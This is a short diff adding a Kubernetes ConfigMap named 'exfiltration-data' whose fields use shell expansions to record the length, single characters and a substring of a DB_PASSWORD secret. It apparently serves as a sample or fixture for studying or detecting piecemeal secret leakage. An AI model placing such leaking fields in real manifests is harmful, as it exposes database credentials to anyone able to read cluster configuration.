@@ -1,0 +1,11 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: exfiltration-data
+  namespace: default
+data:
+  leaked-length: "${#DB_PASSWORD}"
+  leaked-char-0: "${DB_PASSWORD:0:1}"
+  leaked-char-1: "${DB_PASSWORD:1:1}"
+  leaked-char-2: "${DB_PASSWORD:2:1}"
+  leaked-chunk: "${DB_PASSWORD:1:5}"
